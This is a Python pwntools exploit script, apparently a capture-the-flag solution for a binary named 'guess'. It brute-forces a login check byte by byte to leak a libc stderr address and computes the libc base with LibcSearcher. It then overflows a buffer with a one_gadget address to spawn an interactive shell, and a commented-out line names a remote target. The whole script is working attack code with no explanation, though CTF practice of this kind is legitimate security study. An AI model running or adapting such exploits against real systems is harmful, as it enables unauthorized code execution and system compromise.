from pwn import *
import time
from LibcSearcher import *
p=process("./guess")
# p=remote("61.147.171.105",62132)
elf=ELF("./guess")
# libc=ELF('./libc-2.27.so')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
# context.log_level=True
ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

onegadget=0x4f3c2#bak时使用
# onegadget=0xf3fa7
onegadget=0xe3b01
def login(account,password):
    sla(b'Choice: ',b'1')
    sa(b'Account: ' ,account)
    sa(b'Password: ',password)
    recvthing=p.recv(5)
    # print(recvthing)
    if recvthing==b'Login':
        rl()
        return 0
    if recvthing==b'Welco':
        ru(b'me, Boss. Leave your valuable comments: ')
        return 1
stderr=b''
for i in range(6):
    for key in range(0xff):
        # pause()
        account=b'a'*0x10+stderr+p8(key+1)+b'\x00'
        password=b'a'*0x10
        if login(account,password):
            stderr+=p8(key+1)
            p.sendline(b'd')
            break
    print(stderr)
    # pause()
stderr_addr=u64(stderr.ljust(8,b'\x00'))
print("stderr:",hex(stderr_addr))
libc=LibcSearcher('_IO_2_1_stderr_',stderr_addr)
libc.select_libc(0)
libcbase=stderr_addr-libc.dump('_IO_2_1_stderr_')
print("libcbase:",hex(libcbase))
one_gadget_addr=onegadget+libcbase
pause()
login(b'ggg\x00',b'ggg\x00')
payload=b'W'*0x41+p64(one_gadget_addr)
print(payload)
sl(payload)
p.interactive()
